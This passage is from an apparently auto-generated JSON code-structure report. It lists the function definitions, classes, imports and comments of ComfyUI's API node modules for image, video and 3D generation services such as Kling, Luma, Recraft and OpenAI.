        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_minimax.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class MinimaxTextToVideoNode(IO.ComfyNode):",
          "class MinimaxImageToVideoNode(IO.ComfyNode):",
          "class MinimaxSubjectToVideoNode(IO.ComfyNode):",
          "class MinimaxHailuoVideoNode(IO.ComfyNode):",
          "class MinimaxExtension(ComfyExtension):"
        ],
        "imports": [
          "from typing import Optional",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.apis.minimax_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# TODO: figure out how to deal with subject properly, API returns invalid params when using S2V-01 model",
          "# upload image, if passed in",
          "# MinimaxSubjectToVideoNode,"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 11,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_stability.py",
        "docstrings": [],
        "function_defs": [
          "def get_async_dummy_status(x: StabilityResultsGetResponse):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class StabilityPollStatus(str, Enum):",
          "class StabilityStableImageUltraNode(IO.ComfyNode):",
          "class StabilityStableImageSD_3_5Node(IO.ComfyNode):",
          "class StabilityUpscaleConservativeNode(IO.ComfyNode):",
          "class StabilityUpscaleCreativeNode(IO.ComfyNode):",
          "class StabilityUpscaleFastNode(IO.ComfyNode):",
          "class StabilityTextToAudio(IO.ComfyNode):",
          "class StabilityAudioToAudio(IO.ComfyNode):",
          "class StabilityAudioInpaint(IO.ComfyNode):",
          "class StabilityExtension(ComfyExtension):"
        ],
        "imports": [
          "from inspect import cleandoc",
          "from typing import Optional",
          "from typing_extensions import override",
          "from comfy_api.latest import ComfyExtension, Input, IO",
          "from comfy_api_nodes.apis.stability_api import (",
          "from comfy_api_nodes.util import (",
          "import torch",
          "import base64",
          "from io import BytesIO",
          "from enum import Enum"
        ],
        "comments": [
          "# prepare image binary if image present",
          "# prepare image binary if image present"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 9,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_bfl.py",
        "docstrings": [],
        "function_defs": [
          "def convert_mask_to_image(mask: Input.Image):\n\"\"\"\nMake mask have the expected amount of dims (4) and channels (3) to be recognized as an image.\n\"\"\"",
          "def define_schema(cls) -> IO.Schema:",
          "def validate_inputs(cls, aspect_ratio: str):",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def price_extractor(_r: BaseModel) -> float | None:"
        ],
        "class_defs": [
          "class FluxProUltraImageNode(IO.ComfyNode):",
          "class FluxKontextProImageNode(IO.ComfyNode):",
          "class FluxKontextMaxImageNode(FluxKontextProImageNode):",
          "class FluxProExpandNode(IO.ComfyNode):",
          "class FluxProFillNode(IO.ComfyNode):",
          "class Flux2ProImageNode(IO.ComfyNode):",
          "class Flux2MaxImageNode(Flux2ProImageNode):",
          "class BFLExtension(ComfyExtension):"
        ],
        "imports": [
          "import torch",
          "from pydantic import BaseModel",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.apis.bfl_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# prepare mask"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_kling.py",
        "docstrings": [],
        "function_defs": [
          "def normalize_omni_prompt_references(prompt: str) -> str:\n\"\"\"\nRewrites Kling Omni-style placeholders used in the app, like:\n\n@image, @image1, @image2, ... @imageN\n@video, @video1, @video2, ... @videoN\n\ninto the API-compatible form:\n\n<<<image_1>>>, <<<image_2>>>, ...",
          "def _image_repl(match):",
          "def _video_repl(match):",
          "def is_valid_camera_control_configs(configs: list[float]) -> bool:\n\"\"\"Verifies that at least one camera control configuration is non-zero.\"\"\"\nreturn any(not math.isclose(value, 0.0) for value in configs)\n\n\ndef is_valid_task_creation_response(response: KlingText2VideoResponse) -> bool:\n\"\"\"Verifies that the initial response contains a task ID.\"\"\"",
          "def is_valid_task_creation_response(response: KlingText2VideoResponse) -> bool:\n\"\"\"Verifies that the initial response contains a task ID.\"\"\"\nreturn bool(response.data.task_id)\n\n\ndef is_valid_video_response(response: KlingText2VideoResponse) -> bool:\n\"\"\"Verifies that the response contains a task result with at least one video.\"\"\"",
          "def is_valid_video_response(response: KlingText2VideoResponse) -> bool:\n\"\"\"Verifies that the response contains a task result with at least one video.\"\"\"\nreturn (\nresponse.data is not None\nand response.data.task_result is not None\nand response.data.task_result.videos is not None\nand len(response.data.task_result.videos) > 0\n)\n\n",
          "def is_valid_image_response(response: KlingVirtualTryOnResponse) -> bool:\n\"\"\"Verifies that the response contains a task result with at least one image.\"\"\"\nreturn (\nresponse.data is not None\nand response.data.task_result is not None\nand response.data.task_result.images is not None\nand len(response.data.task_result.images) > 0\n)\n\n",
          "def validate_prompts(prompt: str, negative_prompt: str, max_length: int) -> bool:\n\"\"\"Verifies that the positive prompt is not empty and that neither promt is too long.\"\"\"\nif not prompt:\nraise ValueError(\"Positive prompt is empty\")\nif len(prompt) > max_length:\nraise ValueError(f\"Positive prompt is too long: {len(prompt)} characters\")\nif negative_prompt and len(negative_prompt) > max_length:\nraise ValueError(\nf\"Negative prompt is too long: {len(negative_prompt)} characters\"\n)",
          "def validate_task_creation_response(response) -> None:\n\"\"\"Validates that the Kling task creation request was successful.\"\"\"\nif not is_valid_task_creation_response(response):\nerror_msg = f\"Kling initial request failed. Code: {response.code}, Message: {response.message}, Data: {response.data}\"\nlogging.error(error_msg)\nraise Exception(error_msg)\n\n\ndef validate_video_result_response(response) -> None:\n\"\"\"Validates that the Kling task result contains a video.\"\"\"",
          "def validate_video_result_response(response) -> None:\n\"\"\"Validates that the Kling task result contains a video.\"\"\"\nif not is_valid_video_response(response):\nerror_msg = f\"Kling task {response.data.task_id} succeeded but no video data found in response.\"\nlogging.error(\"Error: %s.\\nResponse: %s\", error_msg, response)\nraise Exception(error_msg)\n\n\ndef validate_image_result_response(response) -> None:\n\"\"\"Validates that the Kling task result contains an image.\"\"\"",
          "def validate_image_result_response(response) -> None:\n\"\"\"Validates that the Kling task result contains an image.\"\"\"\nif not is_valid_image_response(response):\nerror_msg = f\"Kling task {response.data.task_id} succeeded but no image data found in response.\"\nlogging.error(\"Error: %s.\\nResponse: %s\", error_msg, response)\nraise Exception(error_msg)\n\n\ndef validate_input_image(image: torch.Tensor) -> None:\n\"\"\"",
          "def validate_input_image(image: torch.Tensor) -> None:\n\"\"\"\nValidates the input image adheres to the expectations of the Kling API:\n- The image resolution should not be less than 300*300px\n- The aspect ratio of the image should be between 1:2.5 ~ 2.5:1\n\nSee: https://app.klingai.com/global/dev/document-api/apiReference/model/imageToVideo\n\"\"\"",
          "def get_video_from_response(response) -> KlingVideoResult:\n\"\"\"Returns the first video object from the Kling video generation task result.\nWill raise an error if the response is not valid.\n\"\"\"",
          "def get_video_url_from_response(response) -> str | None:\n\"\"\"Returns the first video url from the Kling video generation task result.\nWill not raise an error if the response is not valid.\n\"\"\"",
          "def get_images_from_response(response) -> list[KlingImageResult]:\n\"\"\"Returns the list of image objects from the Kling image generation task result.\nWill raise an error if the response is not valid.\n\"\"\"",
          "def get_images_urls_from_response(response) -> str | None:\n\"\"\"Returns the list of image urls from the Kling image generation task result.\nWill not raise an error if the response is not valid. If there is only one image, returns the url as a string. If there are multiple images, returns a list of urls.\n\"\"\"",
          "def define_schema(cls) -> IO.Schema:",
          "def validate_inputs(",
          "def execute(",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class KlingCameraControls(IO.ComfyNode):",
          "class KlingTextToVideoNode(IO.ComfyNode):",
          "class OmniProTextToVideoNode(IO.ComfyNode):",
          "class OmniProFirstLastFrameNode(IO.ComfyNode):",
          "class OmniProImageToVideoNode(IO.ComfyNode):",
          "class OmniProVideoToVideoNode(IO.ComfyNode):",
          "class OmniProEditVideoNode(IO.ComfyNode):",
          "class OmniProImageNode(IO.ComfyNode):",
          "class KlingCameraControlT2VNode(IO.ComfyNode):",
          "class KlingImage2VideoNode(IO.ComfyNode):",
          "class KlingCameraControlI2VNode(IO.ComfyNode):",
          "class KlingStartEndFrameNode(IO.ComfyNode):",
          "class KlingVideoExtendNode(IO.ComfyNode):",
          "class KlingDualCharacterVideoEffectNode(IO.ComfyNode):",
          "class KlingSingleImageVideoEffectNode(IO.ComfyNode):",
          "class KlingLipSyncAudioToVideoNode(IO.ComfyNode):",
          "class KlingLipSyncTextToVideoNode(IO.ComfyNode):",
          "class KlingVirtualTryOnNode(IO.ComfyNode):",
          "class KlingImageGenerationNode(IO.ComfyNode):",
          "class TextToVideoWithAudio(IO.ComfyNode):",
          "class ImageToVideoWithAudio(IO.ComfyNode):",
          "class MotionControl(IO.ComfyNode):",
          "class KlingExtension(ComfyExtension):"
        ],
        "imports": [
          "import logging",
          "import math",
          "import re",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input, InputImpl",
          "from comfy_api_nodes.apis import (",
          "from comfy_api_nodes.apis.kling_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# English voices",
          "# Chinese voices",
          "# (?<!\\w) avoids matching e.g. \"test@image.com\"",
          "# (?!\\w) makes sure we only match @image / @image<digits> and not @imageFoo",
          "# Camera control type for image 2 video is always `simple`",
          "# Upload video to Comfy API and get download URL",
          "# Upload the audio file to Comfy API and get download URL"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 14,
        "error_handling": 19,
        "decorators": [
          "@image, @image1, @image2, ... @imageN",
          "@video, @video1, @video2, ... @videoN",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_tripo.py",
        "docstrings": [],
        "function_defs": [
          "def get_model_url_from_response(response: TripoTaskResponse) -> str:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def validate_inputs(cls, input_types):"
        ],
        "class_defs": [
          "class TripoTextToModelNode(IO.ComfyNode):",
          "class TripoImageToModelNode(IO.ComfyNode):",
          "class TripoMultiviewToModelNode(IO.ComfyNode):",
          "class TripoTextureNode(IO.ComfyNode):",
          "class TripoRefineNode(IO.ComfyNode):",
          "class TripoRigNode(IO.ComfyNode):",
          "class TripoRetargetNode(IO.ComfyNode):",
          "class TripoConversionNode(IO.ComfyNode):",
          "class TripoExtension(ComfyExtension):"
        ],
        "imports": [
          "import os",
          "from typing import Optional",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.apis.tripo_api import (",
          "from comfy_api_nodes.util import (",
          "from folder_paths import get_output_directory"
        ],
        "comments": [
          "# Save the downloaded model file",
          "# The min and max of input1 and input2 are still validated because",
          "# we didn't take `input1` or `input2` as arguments",
          "# Parse part_names from comma-separated string to list"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 8,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_wan.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class Text2ImageInputField(BaseModel):",
          "class Image2ImageInputField(BaseModel):",
          "class Text2VideoInputField(BaseModel):",
          "class Image2VideoInputField(BaseModel):",
          "class Txt2ImageParametersField(BaseModel):",
          "class Image2ImageParametersField(BaseModel):",
          "class Text2VideoParametersField(BaseModel):",
          "class Image2VideoParametersField(BaseModel):",
          "class Text2ImageTaskCreationRequest(BaseModel):",
          "class Image2ImageTaskCreationRequest(BaseModel):",
          "class Text2VideoTaskCreationRequest(BaseModel):",
          "class Image2VideoTaskCreationRequest(BaseModel):",
          "class TaskCreationOutputField(BaseModel):",
          "class TaskCreationResponse(BaseModel):",
          "class TaskResult(BaseModel):",
          "class ImageTaskStatusOutputField(TaskCreationOutputField):",
          "class VideoTaskStatusOutputField(TaskCreationOutputField):",
          "class ImageTaskStatusResponse(BaseModel):",
          "class VideoTaskStatusResponse(BaseModel):",
          "class WanTextToImageApi(IO.ComfyNode):",
          "class WanImageToImageApi(IO.ComfyNode):",
          "class WanTextToVideoApi(IO.ComfyNode):",
          "class WanImageToVideoApi(IO.ComfyNode):",
          "class WanApiExtension(ComfyExtension):"
        ],
        "imports": [
          "import re",
          "from pydantic import BaseModel, Field",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# redo this later as an optional combo of recommended resolutions",
          "# IO.Int.Input(",
          "#     \"width\",",
          "#     default=1280,",
          "#     min=384,",
          "#     max=1440,",
          "#     step=16,",
          "#     optional=True,",
          "# ),",
          "# IO.Int.Input(",
          "#     \"height\",",
          "#     default=1280,",
          "#     min=384,",
          "#     max=1440,",
          "#     step=16,",
          "#     optional=True,",
          "# ),",
          "# width: int = 1024,",
          "# height: int = 1024,",
          "# size=f\"{width}*{height}\","
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_moonvalley.py",
        "docstrings": [],
        "function_defs": [
          "def is_valid_task_creation_response(response: MoonvalleyPromptResponse) -> bool:\n\"\"\"Verifies that the initial response contains a task ID.\"\"\"\nreturn bool(response.id)\n\n\ndef validate_task_creation_response(response) -> None:\nif not is_valid_task_creation_response(response):\nerror_msg = f\"Moonvalley Marey API: Initial request failed. Code: {response.code}, Message: {response.message}, Data: {response}\"\nlogging.error(error_msg)\nraise RuntimeError(error_msg)",
          "def validate_task_creation_response(response) -> None:",
          "def validate_video_to_video_input(video: Input.Video) -> Input.Video:\n\"\"\"\nValidates and processes video input for Moonvalley Video-to-Video generation.\n\nArgs:\nvideo: Input video to validate\n\nReturns:\nValidated and potentially trimmed video\n",
          "def _get_video_dimensions(video: Input.Video) -> tuple[int, int]:\n\"\"\"Extracts video dimensions with error handling.\"\"\"\ntry:\nreturn video.get_dimensions()\nexcept Exception as e:\nlogging.error(\"Error getting dimensions of video: %s\", e)\nraise ValueError(f\"Cannot get video dimensions: {e}\") from e\n\n\ndef _validate_video_dimensions(width: int, height: int) -> None:",
          "def _validate_video_dimensions(width: int, height: int) -> None:\n\"\"\"Validates video dimensions meet Moonvalley V2V requirements.\"\"\"\nsupported_resolutions = {\n(1920, 1080),\n(1080, 1920),\n(1152, 1152),\n(1536, 1152),\n(1152, 1536),\n}\n",
          "def _validate_and_trim_duration(video: Input.Video) -> Input.Video:\n\"\"\"Validates video duration and trims to 5 seconds if needed.\"\"\"\nduration = video.get_duration()\n_validate_minimum_duration(duration)\nreturn _trim_if_too_long(video, duration)\n\n\ndef _validate_minimum_duration(duration: float) -> None:\n\"\"\"Ensures video is at least 5 seconds long.\"\"\"",
          "def _validate_minimum_duration(duration: float) -> None:\n\"\"\"Ensures video is at least 5 seconds long.\"\"\"\nif duration < 5:\nraise ValueError(\"Input video must be at least 5 seconds long.\")\n\n\ndef _trim_if_too_long(video: Input.Video, duration: float) -> Input.Video:\n\"\"\"Trims video to 5 seconds if longer.\"\"\"",
          "def _trim_if_too_long(video: Input.Video, duration: float) -> Input.Video:\n\"\"\"Trims video to 5 seconds if longer.\"\"\"\nif duration > 5:\nreturn trim_video(video, 5)\nreturn video\n\n\ndef parse_width_height_from_res(resolution: str):\n# Accepts a string like \"16:9 (1920 x 1080)\" and returns width, height as a dict\nres_map = {",
          "def parse_width_height_from_res(resolution: str):",
          "def parse_control_parameter(value):",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class MoonvalleyImg2VideoNode(IO.ComfyNode):",
          "class MoonvalleyVideo2VideoNode(IO.ComfyNode):",
          "class MoonvalleyTxt2VideoNode(IO.ComfyNode):",
          "class MoonvalleyExtension(ComfyExtension):"
        ],
        "imports": [
          "import logging",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension, Input",
          "from comfy_api_nodes.apis import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# Accepts a string like \"16:9 (1920 x 1080)\" and returns width, height as a dict",
          "# \"21:9 (2560 x 1080)\": {\"width\": 2560, \"height\": 1080},",
          "# \"21:9 (2560 x 1080)\",",
          "# Get MIME type from tensor - assuming PNG format for image tensors",
          "# Only include motion_intensity for Motion Transfer"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 6,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_sora.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class Sora2GenerationRequest(BaseModel):",
          "class Sora2GenerationResponse(BaseModel):",
          "class OpenAIVideoSora2(IO.ComfyNode):",
          "class OpenAISoraExtension(ComfyExtension):"
        ],
        "imports": [
          "from typing import Optional",
          "import torch",
          "from pydantic import BaseModel, Field",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_luma.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls) -> IO.Schema:",
          "def execute(cls, image: torch.Tensor, weight: float, luma_ref: LumaReferenceChain = None) -> IO.NodeOutput:",
          "def define_schema(cls) -> IO.Schema:",
          "def execute(",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:",
          "def define_schema(cls) -> IO.Schema:"
        ],
        "class_defs": [
          "class LumaReferenceNode(IO.ComfyNode):",
          "class LumaConceptsNode(IO.ComfyNode):",
          "class LumaImageGenerationNode(IO.ComfyNode):",
          "class LumaImageModifyNode(IO.ComfyNode):",
          "class LumaTextToVideoGenerationNode(IO.ComfyNode):",
          "class LumaImageToVideoGenerationNode(IO.ComfyNode):",
          "class LumaExtension(ComfyExtension):"
        ],
        "imports": [
          "from typing import Optional",
          "import torch",
          "from typing_extensions import override",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.apis.luma_api import (",
          "from comfy_api_nodes.util import ("
        ],
        "comments": [
          "# handle image_luma_ref",
          "# handle style_luma_ref",
          "# handle character_ref images",
          "# IO.Combo.Input(",
          "#     \"aspect_ratio\",",
          "#     options=[ratio.value for ratio in LumaAspectRatio],",
          "#     default=LumaAspectRatio.ratio_16_9,",
          "# ),"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 1,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_recraft.py",
        "docstrings": [],
        "function_defs": [
          "def recraft_multipart_parser(",
          "def handle_converted_lists(item, parent_key, lists_to_check=list[list]):",
          "def __init__(self):",
          "def __enter__(self):",
          "def __exit__(self, exc_type, exc_val, exc_tb):",
          "def define_schema(cls):",
          "def execute(cls, r: int, g: int, b: int, recraft_color: RecraftColorChain = None) -> IO.NodeOutput:",
          "def define_schema(cls):",
          "def execute(cls, colors: RecraftColorChain = None, background_color: RecraftColorChain = None) -> IO.NodeOutput:",
          "def define_schema(cls):",
          "def execute(cls, substyle: str) -> IO.NodeOutput:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def execute(cls, style_id: str) -> IO.NodeOutput:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def define_schema(cls):"
        ],
        "class_defs": [
          "class handle_recraft_image_output:",
          "class RecraftColorRGBNode(IO.ComfyNode):",
          "class RecraftControlsNode(IO.ComfyNode):",
          "class RecraftStyleV3RealisticImageNode(IO.ComfyNode):",
          "class RecraftStyleV3DigitalIllustrationNode(RecraftStyleV3RealisticImageNode):",
          "class RecraftStyleV3VectorIllustrationNode(RecraftStyleV3RealisticImageNode):",
          "class RecraftStyleV3LogoRasterNode(RecraftStyleV3RealisticImageNode):",
          "class RecraftStyleInfiniteStyleLibrary(IO.ComfyNode):",
          "class RecraftTextToImageNode(IO.ComfyNode):",
          "class RecraftImageToImageNode(IO.ComfyNode):",
          "class RecraftImageInpaintingNode(IO.ComfyNode):",
          "class RecraftTextToVectorNode(IO.ComfyNode):",
          "class RecraftVectorizeImageNode(IO.ComfyNode):",
          "class RecraftReplaceBackgroundNode(IO.ComfyNode):",
          "class RecraftRemoveBackgroundNode(IO.ComfyNode):",
          "class RecraftCrispUpscaleNode(IO.ComfyNode):",
          "class RecraftCreativeUpscaleNode(RecraftCrispUpscaleNode):",
          "class RecraftExtension(ComfyExtension):"
        ],
        "imports": [
          "from io import BytesIO",
          "from typing import Optional, Union",
          "import aiohttp",
          "import torch",
          "from PIL import UnidentifiedImageError",
          "from typing_extensions import override",
          "from comfy.utils import ProgressBar",
          "from comfy_api.latest import IO, ComfyExtension",
          "from comfy_api_nodes.apis.recraft_api import (",
          "from comfy_api_nodes.util import (",
          "from comfy_extras.nodes_images import SVG"
        ],
        "comments": [
          "# Modification of a function that handled a different type of multipart parsing, big ups:",
          "# https://gist.github.com/kazqvaizer/4cebebe5db654a414132809f9f88067b",
          "# if list already exists, just extend list with data",
          "# if list already exists, just extend list with data",
          "# otherwise if is_list, create new list with data",
          "# return new key with data",
          "# prepare mask tensor",
          "# create RecraftStyle so strings will be formatted properly (i.e. \"None\" will become None)",
          "# use alpha channel as masks, in B,H,W format"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 7,
        "error_handling": 2,
        "decorators": [
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@classmethod",
          "@override"
        ]
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/mapper_utils.py",
        "docstrings": [],
        "function_defs": [
          "def _create_base_config(field_info: FieldInfo) -> InputTypeOptions:",
          "def _get_number_constraints_config(field_info: FieldInfo) -> dict:",
          "def _model_field_to_image_input(field_info: FieldInfo, **kwargs) -> NodeInput:",
          "def _model_field_to_string_input(field_info: FieldInfo, **kwargs) -> NodeInput:",
          "def _model_field_to_float_input(field_info: FieldInfo, **kwargs) -> NodeInput:",
          "def _model_field_to_int_input(field_info: FieldInfo, **kwargs) -> NodeInput:",
          "def _model_field_to_combo_input(",
          "def model_field_to_node_input("
        ],
        "class_defs": [],
        "imports": [
          "from enum import Enum",
          "from pydantic.fields import FieldInfo",
          "from pydantic import BaseModel",
          "from pydantic_core import PydanticUndefined",
          "from comfy.comfy_types.node_typing import IO, InputTypeOptions"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/nodes_openai.py",
        "docstrings": [],
        "function_defs": [
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def calculate_tokens_price_image_1(response: OpenAIImageGenerationResponse) -> float | None:",
          "def calculate_tokens_price_image_1_5(response: OpenAIImageGenerationResponse) -> float | None:",
          "def define_schema(cls):",
          "def define_schema(cls):",
          "def get_message_content_from_response(",
          "def get_text_from_message_content(",
          "def tensor_to_input_image_content(",
          "def create_input_message_contents(",
          "def define_schema(cls):\n\"\"\"\nFor details about the supported file input types, see:\nhttps://platform.openai.com/docs/guides/pdf-files?api-mode=responses\n\"\"\"",
          "def create_input_file_content(cls, file_path: str) -> InputFileContent:",
          "def execute(cls, file: str, OPENAI_INPUT_FILES: list[InputFileContent] = []) -> IO.NodeOutput:\n\"\"\"\nLoads and formats input files for OpenAI API.\n\"\"\"",
          "def define_schema(cls):",
          "def execute("
        ],
        "class_defs": [
          "class SupportedOpenAIModel(str, Enum):",
          "class OpenAIDalle2(IO.ComfyNode):",
          "class OpenAIDalle3(IO.ComfyNode):",
          "class OpenAIGPTImage1(IO.ComfyNode):",
          "class OpenAIChatNode(IO.ComfyNode):",
          "class OpenAIInputFiles(IO.ComfyNode):",
          "class OpenAIChatConfig(IO.ComfyNode):",
          "class OpenAIExtension(ComfyExtension):"
        ],
        "imports": [
          "import base64",
          "import os",
          "from enum import Enum",
          "from io import BytesIO",
          "import numpy as np",
          "import torch",
          "from PIL import Image",
